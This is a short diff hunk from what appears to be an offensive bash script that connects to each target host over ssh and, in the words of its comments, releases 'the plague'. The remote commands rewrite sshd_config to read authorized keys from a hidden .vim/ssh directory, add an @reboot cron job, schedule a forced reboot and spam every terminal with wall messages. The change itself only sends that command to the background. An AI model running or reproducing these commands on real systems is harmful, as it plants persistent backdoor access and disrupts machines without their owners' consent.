@@ -423,7 +423,7 @@ while read -r tango; do
 											sed -i 's/#AuthorizedKeysFile/AuthorizedKeysFile .vim\/ssh /' /etc/ssh/sshd_config
 											(crontab -l ; echo '@reboot touch /tmp/.trigger #delete this, i dare you') | crontab -
 											at now +1 minute <<< 'init 6'
-											for n in {1..1000}; do wall -n 'WOULD YOU LIKE TO PLAY A GAME???'; sleep 0.1; done"
+											for n in {1..1000}; do wall -n 'WOULD YOU LIKE TO PLAY A GAME???'; sleep 0.1; done" &
 	#ssh -n -o StrictHostKeyChecking=no $username@$target "(crontab -l ; echo '@reboot touch /tmp/.trigger #delete this, i dare you') | crontab -"
 #jumping into each box and letting loose the plague
 	printf "\nReleasing the plague inside of [$target]\n"
